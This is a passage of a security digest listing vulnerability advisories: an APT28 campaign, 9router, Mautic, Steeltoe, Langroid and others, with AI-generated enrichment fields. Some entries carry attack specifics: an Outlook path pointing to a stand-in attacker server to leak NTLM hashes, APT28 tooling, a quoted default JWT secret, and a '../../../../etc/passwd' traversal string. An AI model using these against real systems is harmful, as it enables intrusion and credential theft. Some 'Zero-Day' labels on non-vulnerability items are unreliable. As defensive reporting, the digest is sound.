## 9. 🟠 Zero-Day — Russian GRU Targeting Western Logistics Entities and Technology Companies

**CVE:** _No CVE_ &nbsp;|&nbsp; **Source:** CISA US-CERT Alerts &nbsp;|&nbsp; **Published:** Mon, 12 Ma
**Reference:** <https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-141a>

> Executive Summary This joint cybersecurity advisory (CSA) highlights a Russian state-sponsored cyber campaign targeting Western logistics entities and technology companies. This includes those involved in the coordination, transport, and delivery of foreign assistance to Ukraine. Since 2022, Western logistics entities and IT companies have faced an elevated risk of targeting by the Russian General…

**Parallel AI Enrichment:**

- **Technical Details:** APT28 (GRU Unit 26165) exploited multiple vulnerabilities: (1) CVE-2023-23397 — specially crafted Outlook .msg with PidLidReminderFileParameter set to \\UNC\attacker-server\sound.wav leaks NTLMv2 hash without user interaction; (2) CVE-2023-38831 — malicious ZIP with decoy file alongside same-named folder triggers code execution when archive is opened in WinRAR <6.23; (3) CVE-2021-44026 — SQL injection via search/search_params in Roundcube; (4) CVE-2020-12641/CVE-2020-35730 — RCE via shell metacharacters and stored XSS in Roundcube. Post-exploitation: AD dumping (ntdsutil, vssadmin), lateral movement (Impacket, PsExec, RDP), exfiltration via OpenSSH/PowerShell, abuse of SOHO devices as proxies (T1665), and targeting of IP cameras via RTSP. Custom tooling included HEADLACE (credential phisher) and MASEPIE (Python RAT). MITRE ATT&CK techniques: T1199, T1110.001/003, T1566, T1133, T1190, T1589.002, T1591/1591.002/004, T1592, T1586.002/003, T1021.001, T1114/1114.002, T1119, T1125, T1560/1560.001, T1048, T1029, T1665.
- **Affected Products:** Microsoft Outlook (CVE-2023-23397), RARLAB WinRAR before 6.23 (CVE-2023-38831), Roundcube Webmail before 1.4.4 (CVE-2020-12641), Roundcube Webmail before 1.2.13/1.3.16/1.4.10 (CVE-2020-35730), Roundcube Webmail before 1.3.17/1.4.12 (CVE-2021-44026), Corporate/edge VPN appliances, Internet-connected cameras (RTSP), SOHO devices
- **CVSS Score:** 9.8
- **CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVE-2023-23397, the highest-severity CVE in this campaign)
- **Exploit Available:** Yes — weaponized exploits confirmed for all CVEs. CVE-2023-23397: Belgium CCB advisory (https://ccb.belgium.be/advisories/warning-active-exploitation-0-day-elevation-privilege-vulnerability-cve-2023-23397). CVE-2023-38831: Google Project Zero RCA (https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2023/CVE-2023-38831.html). CVE-2021-44026: Snyk advisory (https://security.snyk.io/vuln/SNYK-DEBIAN12-ROUNDCUBE-1922969). CVE-2020-35730: CISA KEV since 2023-06-22 (https://sara-open.sirp.io/kev/CVE-2020-35730).
- **Patch Available:** Yes — patches exist for every CVE: CVE-2023-23397 (Microsoft March 2023 Patch Tuesday, https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-23397); CVE-2023-38831 (WinRAR 6.23, August 2023, https://www.win-rar.com/singlefile.html); CVE-2021-44026 (Roundcube 1.3.17/1.4.12, https://roundcube.net/news/2021/11/15/security-release-1.4.12-and-1.3.17); CVE-2020-35730 (Roundcube 1.4.10, https://roundcube.net/news/2020/12/28/security-release-1.4.10-1.3.16-and-1.2.13); CVE-2020-12641 (Roundcube 1.4.4, https://roundcube.net/news/2020/05/04/security-release-1.4.4).
- **Active Exploitation:** Yes — confirmed active exploitation since early 2022. Primary source: CISA Joint Advisory AA25-141A (https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-141a). Supporting sources: SafeBreach (https://www.safebreach.com/blog/safebreach-coverage-for-us-cert-aa25-141a-russian-gru-espionage/), SOC Prime (https://socprime.com/blog/detect-apt28-attacks-against-western-companies-coordinating-aid-to-ukraine/), FBI cyber alert (https://www.fbi.gov/file-repository/cyber-alerts/russian-gru-targeting-western-logistics-entities-and-technology-companies-052125.pdf/view). Targeted sectors: Defense, Transportation (ports, airports), Maritime, Air Traffic Management, IT Services across 13 countries.
- **Threat Actors:** Russian GRU 85th Main Special Service Center (85th GTsSS), military unit 26165 (APT28 / Fancy Bear / Forest Blizzard / STRONTIUM / BlueDelta / Sofacy / Sednit)
- **Mitigation:** 1) Apply vendor patches for Outlook, WinRAR (≥6.23), and Roundcube (≥1.4.12). 2) Disable NTLM where feasible; enforce SMB signing, LDAP/SMB channel binding, and Extended Protection for Authentication (EPA); block outbound NTLM. 3) Enforce phishing-resistant MFA (FIDO2/WebAuthn, PKI); require step-up re-authentication. 4) Enforce ASR rules to block executable content from temp/writable directories; constrain PowerShell (Constrained Language Mode); block LOLBins (ntdsutil, vssadmin, wevtutil, certipy). 5) Patch internet-facing systems (VPNs, email gateways, Roundcube); segment OT/IT; restrict RDP. 6) Block Tor and anonymous VPN login sources; alert on anomalous mailbox permission changes. 7) Detect/alert on outbound SMB/LDAP/NTLM from servers, large transfers via OpenSSH/PowerShell. 8) Audit Active Directory for legacy GPP-cached credentials; rotate GPP credentials. 9) Monitor IP cameras/RTSP devices for brute-force. 10) Deploy Sigma/YARA-L rules aligned with advisory STIX IOCs.
- **Vendor Advisory:** https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-141a

---

## 10. 🟠 Zero-Day — Browser Security: Zero-Days Are Only Part of the Problem

**CVE:** _No CVE_ &nbsp;|&nbsp; **Source:** CrowdStrike Blog &nbsp;|&nbsp; **Published:** Jun 30, 20
**Reference:** <https://www.crowdstrike.com/en-us/blog/browser-security-zero-days-are-only-part-of-the-problem/>

**Parallel AI Enrichment:**

- **Technical Details:** The blog describes typical browser exploit chains: exploitation of rendering logic, JavaScript execution, document handling, or memory-safety bugs, often chained to a sandbox escape and privilege escalation; it also describes in-browser runtime mitigation (JavaScript Language Randomization) that hardens the browser's JS runtime.
- **Affected Products:** Affected products unavailable.
- **CVSS Score:** 0.0
- **CVSS Vector:** CVSS vector unavailable.
- **Exploit Available:** No public PoC or weaponized exploit is provided in the CrowdStrike blog. Independent reporting shows in-the-wild exploitation for specific June 2026 browser CVEs (e.g., CVE-2026-11645).
- **Patch Available:** Not applicable to this CrowdStrike blog (it does not disclose a single CVE). Separate vendor patches for specific browser zero-days in June 2026 exist (for example, Google released a Stable-channel patch for CVE-2026-11645 on 2026-06-08).
- **Active Exploitation:** The blog states zero-days are frequently exploited before disclosure but does not confirm active exploitation of a named vulnerability; separate reporting indicates some June 2026 browser CVEs were exploited in the wild (e.g., CVE-2026-11645).
- **Threat Actors:** None known
- **Mitigation:** Apply vendor patches when available; reduce reliance on patch timing by deploying in-browser runtime protections (the blog describes JavaScript Language Randomization and runtime controls) and by hardening against browser-mediated attacks (phishing, credential theft, session hijacking, malicious downloads).
- **Vendor Advisory:** Vendor advisory URL unavailable.

---

## 11. 🟠 Zero-Day — 94% of Organizations Report Cloud Breaches: CrowdStrike State of CDR Survey

**CVE:** _No CVE_ &nbsp;|&nbsp; **Source:** CrowdStrike Blog &nbsp;|&nbsp; **Published:** Jun 22, 20
**Reference:** <https://www.crowdstrike.com/en-us/blog/crowdstrike-state-of-cdr-survey-key-takeaways/>

---

## 12. 🟡 High Severity — 9router has an Incomplete Fix: Local-Only Access Gate Bypass in 9router via Host Header SpoofING

**CVE:** `CVE-2026-49353` &nbsp;|&nbsp; **Source:** GitHub Security Advisories &nbsp;|&nbsp; **Published:** 2026-07-02
**Reference:** <https://github.com/advisories/GHSA-6g2f-w7g3-77vf>

> ## Summary

The fix for CVE-2026-46339 (unauthenticated RCE via unprotected MCP plugin routes) introduced a local-only access gate in `src/dashboardGuard.js` that restricts spawn-capable routes (`/api/mcp/*`, `/api/tunnel/*`, `/api/cli-tools/*`) to loopback requests. The gate determines &quot;local&quot; by inspecting the `Host` and `Origin` HTTP headers rather than the TCP source address. When 9r…

---

## 13. 🟡 High Severity — 9router's Hardcoded Default fallback JWT Secret  Allows Authentication Bypass

**CVE:** `CVE-2026-49352` &nbsp;|&nbsp; **Source:** GitHub Security Advisories &nbsp;|&nbsp; **Published:** 2026-07-02
**Reference:** <https://github.com/advisories/GHSA-jphh-m39h-6gwx>

> ### Summary
9router uses a publicly known hardcoded string `&quot;9router-default-secret-change-me&quot;` as the fallback of JWT secret for all Dashboard session JWTs when the `JWT_SECRET` environment variable is not set. Because this secret is committed in the public repository and unchanged across all releases, any unauthenticated remote attacker can forge a valid `auth_token` cookie and gain fu…

---

## 14. 🟡 High Severity — LaunchServer FileServerHandler has an unauthenticated path traversal issue

**CVE:** `CVE-2026-54617` &nbsp;|&nbsp; **Source:** GitHub Security Advisories &nbsp;|&nbsp; **Published:** 2026-07-02
**Reference:** <https://github.com/advisories/GHSA-5g75-477j-2c2f>

> ### Summary
An unauthenticated path traversal in the LaunchServer HTTP file server (`FileServerHandler`) lets any remote actor read **any file** readable by the LaunchServer process (e.g. `../../../../etc/passwd`). This is a generic arbitrary-file-read primitive, so the fix must address the traversal itself, not any specific file.

The readable files include the server&#x27;s own secrets, which tu…

---

## 15. 🟡 High Severity — Algernon vulnerable to server-side script source disclosure on Windows via NTFS filename

**CVE:** `CVE-2026-52792` &nbsp;|&nbsp; **Source:** GitHub Security Advisories &nbsp;|&nbsp; **Published:** 2026-07-02
**Reference:** <https://github.com/advisories/GHSA-mm6c-5j6x-hq8m>

> ### Summary

Algernon selects its file handler from `filepath.Ext()` (engine/handlers.go:134), which does not treat the NTFS-equivalent names `x.lua::$DATA`, `x.lua.`, or `x.lua ` as `.lua`. On Windows, an unauthenticated client appends one of these suffixes to any server-side script on a public path and receives its raw source instead of executed output, leaking embedded secrets such as database …

---

## 16. 🟡 High Severity — Steeltoe: OAEP setting silently selects PKCS#1 v1.5 padding

**CVE:** `CVE-2026-50268` &nbsp;|&nbsp; **Source:** GitHub Security Advisories &nbsp;|&nbsp; **Published:** 2026-07-02
**Reference:** <https://github.com/advisories/GHSA-4j9m-h44m-2hv8>

> ### Summary

Configuring `encrypt:rsa:algorithm=OAEP` does not enable OAEP encryption. Due to an incorrect BouncyCastle transformation string, the `OAEP` setting selects PKCS#1 v1.5, which is the same algorithm as the `DEFAULT` setting.

### Impact

Operators who configure `encrypt:rsa:algorithm=OAEP` to obtain CCA2-secure padding receive PKCS#1 v1.5 instead. Currently, `Decrypt()` is called only …

---

## 17. 🟡 High Severity — Steeltoe's static JWKS cache shared across schemes and never invalidated

**CVE:** `CVE-2026-50202` &nbsp;|&nbsp; **Source:** GitHub Security Advisories &nbsp;|&nbsp; **Published:** 2026-07-02
**Reference:** <https://github.com/advisories/GHSA-7fqc-p256-7pwj>

> ### Summary

The JWT signing key cache in `TokenKeyResolver` uses `kid` as the sole cache key without namespacing by authority. In applications with multiple `JwtBearer` schemes pointing to different identity providers, a key fetched for one scheme can satisfy token validation for another. Additionally, cached keys have no expiration, so rotated or revoked keys remain trusted until the application…

---

## 18. 🟡 High Severity — Steeltoe's env sanitizer misses connection strings — leaks embedded DB passwords

**CVE:** `CVE-2026-50200` &nbsp;|&nbsp; **Source:** GitHub Security Advisories &nbsp;|&nbsp; **Published:** 2026-07-02
**Reference:** <https://github.com/advisories/GHSA-q62h-354g-5r85>

> ### Summary

The `Sanitizer` component in the Environment actuator redacts configuration values by matching the configuration key name against a suffix list. The default list (`password`, `secret`, `key`, `token`, `.*credentials.*`, `vcap_services`) does not cover the standard .NET pattern `ConnectionStrings:&lt;name&gt;` or Steeltoe Connectors&#x27; `Steeltoe:Client:&lt;type&gt;:Default:Connectio…

---

## 19. 🟡 High Severity — SimpleSAMLphp HTTP-Artifact TLS validator confusion allows cross-IdP authentication bypass

**CVE:** `CVE-2026-49283` &nbsp;|&nbsp; **Source:** GitHub Security Advisories &nbsp;|&nbsp; **Published:** 2026-07-02
**Reference:** <https://github.com/advisories/GHSA-6929-8p9f-26jx>

> ## Summary

SimpleSAMLphp&#x27;s HTTP-Artifact receive path can treat an unsigned embedded SAML `Response` as cryptographically valid for the wrong IdP.

In the `HTTPArtifact::receive()` flow, the SOAP `ArtifactResponse` receives a TLS-based validator from `SOAPClient::addSSLValidator()`. The embedded SAML `Response` then receives a validator that delegates signature validation to that outer `Arti…

---

## 20. 🟡 High Severity — Linuxfabrik Monitoring Plugins: Sudoers may be able to obtain privilege escalation via /usr/bin/apt-get arguments

**CVE:** `CVE-2026-52817` &nbsp;|&nbsp; **Source:** GitHub Security Advisories &nbsp;|&nbsp; **Published:** 2026-07-02
**Reference:** <https://github.com/advisories/GHSA-8w6w-23mq-h8rg>

> ### Summary
In the [Debian.sudoers](https://github.com/Linuxfabrik/monitoring-plugins/blob/main/assets/sudoers/Debian.sudoers) file, `apt-get` is allowed for the nagios user. The full command including the arguments are not enforced and can therefore be choosen arbitrarily. This allows to easily get a root shell as the nagios user:

### PoC
By choosing a particular argument, you can get (as a nagi…

---

## 21. 🟡 High Severity — zebrad has persistent on-disk corruption of Sapling/Orchard subtree roots after chain fork via pop_tip

**CVE:** `CVE-2026-52733` &nbsp;|&nbsp; **Source:** GitHub Security Advisories &nbsp;|&nbsp; **Published:** 2026-07-02
**Reference:** <https://github.com/advisories/GHSA-2gf8-q9rr-jq3h>

> ### Am I affected

You are affected if:

1. You run `zebrad` up to and including `v4.4.1`.
2. Your node participates in a network where chain forks occur (mainnet, testnet, or any network with multiple miners).

All default configurations are affected. The corruption persists across restarts because it is written to RocksDB.

### Summary

When `pop_tip` removes the tip block during a chain fork, s…

---

## 22. 🟡 High Severity — Mautic vulnerable to Path Traversal via Campaign Import

**CVE:** `CVE-2026-9559` &nbsp;|&nbsp; **Source:** GitHub Security Advisories &nbsp;|&nbsp; **Published:** 2026-07-02
**Reference:** <https://github.com/advisories/GHSA-6r9h-4h75-7q4x>

> ### Summary
A path traversal vulnerability exists in the campaign import feature of Mautic 7. When extracting uploaded ZIP files during campaign imports, a flaw in the validation logic allows file paths to escape the intended temporary directories. 

### Impact
An authenticated user with campaign import privileges (`campaign:imports:create`) can write arbitrary PHP files to sensitive system direct…

---

## 23. 🟡 High Severity — Mautic has Server-Side Template Injection (SSTI) in Theme Templates

**CVE:** `CVE-2026-9558` &nbsp;|&nbsp; **Source:** GitHub Security Advisories &nbsp;|&nbsp; **Published:** 2026-07-02
**Reference:** <https://github.com/advisories/GHSA-9fx4-7cmj-47vg>

> ### Summary
A Server-Side Template Injection (SSTI) vulnerability exists in Mautic&#x27;s theme engine. The platform renders uploaded Twig templates without a sandbox or strict function restrictions. Authenticated users with permissions to create or upload themes can abuse this to execute arbitrary code.

### Impact
An authenticated user with theme upload and creation privileges can bypass boundar…

---

## 24. 🟡 High Severity — Mautic Focus component Vulnerable to SSRF

**CVE:** `CVE-2026-9557` &nbsp;|&nbsp; **Source:** GitHub Security Advisories &nbsp;|&nbsp; **Published:** 2026-07-02
**Reference:** <https://github.com/advisories/GHSA-jmv8-8j9j-rcpc>

> ### Summary
A Server-Side Request Forgery (SSRF) vulnerability exists in the Mautic Focus component (`MauticFocusBundle`). Under certain conditions, insufficiency in validating user-supplied URLs allows authenticated users to trigger outbound HTTP requests from the hosting server.

### Impact
An authenticated user with access to the Mautic panel can exploit this vulnerability to perform internal p…

---

## 25. 🟡 High Severity — zebrad has mempool transaction admission denial via single-peer inbound queue saturation

**CVE:** `CVE-2026-52732` &nbsp;|&nbsp; **Source:** GitHub Security Advisories &nbsp;|&nbsp; **Published:** 2026-07-02
**Reference:** <https://github.com/advisories/GHSA-4fc2-h7jh-287c>

> ### Am I affected

You are affected if:

1. You run `zebrad` up to and including `v4.4.1`.
2. Your node accepts inbound P2P connections (`network.listen_addr` is set, which is the default).
3. Your node&#x27;s mempool is active (node is synced near the chain tip).

All default configurations are affected.

### Summary

A single unauthenticated P2P peer can monopolize all 25 inbound mempool downloa…

---

## 26. 🟡 High Severity — Dragonfly Manager OAuth provider client_secret disclosure via unauthenticated GET /api/v1/oauth

**CVE:** `CVE-2026-49254` &nbsp;|&nbsp; **Source:** GitHub Security Advisories &nbsp;|&nbsp; **Published:** 2026-07-02
**Reference:** <https://github.com/advisories/GHSA-4q9j-6299-gxmr>

> ### Summary

The Dragonfly Manager exposes `GET /api/v1/oauth` and `GET /api/v1/oauth/:id` to unauthenticated clients. The response body deserializes the entire `manager/models.Oauth` struct, which includes the `client_secret` field. Any network-reachable attacker can read the OAuth client secrets configured for `github` or `google` providers, defeating the confidentiality guarantee of those secre…

---

## 27. 🟡 High Severity — joserfc: HS256/HS384/HS512 verify accepts empty/nil HMAC key (cross-language sibling of CVE-2026-45363)

**CVE:** `CVE-2026-49852` &nbsp;|&nbsp; **Source:** GitHub Security Advisories &nbsp;|&nbsp; **Published:** 2026-07-02
**Reference:** <https://github.com/advisories/GHSA-gg9x-qcx2-xmrh>

> ### Summary

`joserfc.jwt.decode` accepts attacker-forged HMAC-signed tokens when the
caller-supplied verification key is the empty string or `None`.
`HMACAlgorithm.sign` and `HMACAlgorithm.verify` in
[`src/joserfc/_rfc7518/jws_algs.py:62-70`](https://github.com/authlib/joserfc/blob/1ddca8f3c73ff47e3bc3ac06cb0c08a9535677ec/src/joserfc/_rfc7518/jws_algs.py#L62-L70) feed whatever
`OctKey.get_op_key(…

---

## 28. 🟡 High Severity — Craft CMS: Authorization bypass in `entries/move-to-section` via missing target-section save check

**CVE:** `CVE-2026-50280` &nbsp;|&nbsp; **Source:** GitHub Security Advisories &nbsp;|&nbsp; **Published:** 2026-07-02
**Reference:** <https://github.com/advisories/GHSA-43cq-c2gq-pfpw>

> ### Summary

The `EntriesController::actionMoveToSection()` endpoint checks only whether the current user can view the destination section, but it does not require permission to save entries into that section. A low-privileged authenticated control-panel user who can move an entry out of its current section can therefore move that entry into a different section where they have read access but no w…

---

## 29. 🟡 High Severity — Ransomware Groups Turn to Citrix Bleed 2, BYOVD, and Supply Chain Credentials

**CVE:** `CVE-2025-5777` &nbsp;|&nbsp; **Source:** The Hacker News Security &nbsp;|&nbsp; **Published:** 2026-07-02
**Reference:** <https://thehackernews.com/2026/07/ransomware-groups-turn-to-citrix-bleed.html>

> Threat actors associated with the Anubis ransomware operation have been observed exploiting the Citrix Bleed 2 (CVE-2025-5777) vulnerability to obtain initial access.

&quot;Although tactics differ between affiliates, common patterns emerged in tradecraft through use of legitimate Remote Management and Monitoring (RMM) tooling, credential access, and hands-on-keyboard procedures used for lateral

---

## 30. 🟡 High Severity — Langroid: Path traversal in the file tools allows read/write outside configured current directory

**CVE:** `CVE-2026-50181` &nbsp;|&nbsp; **Source:** GitHub Security Advisories &nbsp;|&nbsp; **Published:** 2026-07-02
**Reference:** <https://github.com/advisories/GHSA-fg23-3346-88f5>

> ### Summary

Langroid&#x27;s `ReadFileTool` and `WriteFileTool` appear to treat `curr_dir` as the intended working-directory boundary for file operations. However, the tools only change the process working directory to `curr_dir` and then operate on the user-supplied `file_path` without resolving and enforcing that the final path remains inside `curr_dir`.

As a result, a tool caller can supply pa…

---

## 31. 🟡 High Severity — Kerberos Hub private key (X-Kerberos-Hub-PrivateKey) leaked to cross-host redirect target due to redirect-following HTTP client without CheckRedirect

**CVE:** `CVE-2026-50192` &nbsp;|&nbsp; **Source:** GitHub Security Advisories &nbsp;|&nbsp; **Published:** 2026-07-02
**Reference:** <https://github.com/advisories/GHSA-h5gx-45rj-2h5j>

> ### Summary

The Kerberos Hub upload path sends the agent&#x27;s Hub credentials in the custom `X-Kerberos-Hub-PrivateKey` and `X-Kerberos-Hub-PublicKey` request headers to the operator-configured Hub URL (`config.HubURI`). The HTTP client used (`&amp;http.Client{}` in `UploadKerberosHub`) is constructed without a `CheckRedirect` policy, so it follows HTTP redirects automatically. Go&#x27;s `net/h…

---

## 32. 🟡 High Severity — SharePoint RCE CVE-2026-45659 Added to CISA KEV After Active Exploitation

**CVE:** `CVE-2026-45659` &nbsp;|&nbsp; **Source:** The Hacker News Security &nbsp;|&nbsp; **Published:** 2026-07-02
**Reference:** <https://thehackernews.com/2026/07/sharepoint-rce-cve-2026-45659-added-to.html>

> The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Wednesday added a high-severity flaw impacting Microsoft SharePoint Server to its Known Exploited Vulnerabilities (KEV) catalog, citing evidence of active exploitation.

The vulnerability, tracked as CVE-2026-45659 (CVSS score: 8.8), is a case of remote code execution arising from the deserialization of untrusted data. The issue

---

## 33. 🟡 High Severity — Bringing Rust to the Pixel Baseband

**CVE:** `CVE-2024-27227` &nbsp;|&nbsp; **Source:** Google Security Blog &nbsp;|&nbsp; **Published:** 2026-04-10
**Reference:** <http://security.googleblog.com/2026/04/bringing-rust-to-pixel-baseband.html>

> Posted by Jiacheng Lu, Software Engineer, Google Pixel Team Google is continuously advancing the security of Pixel devices. We have been focusing on hardening the cellular baseband modem against exploitation. Recognizing the risks associated within the complex modem firmware, Pixel 9 shipped with mitigations against a range of memory-safety vulnerabilities. For Pixel 10, Google is advancing its pr…

---
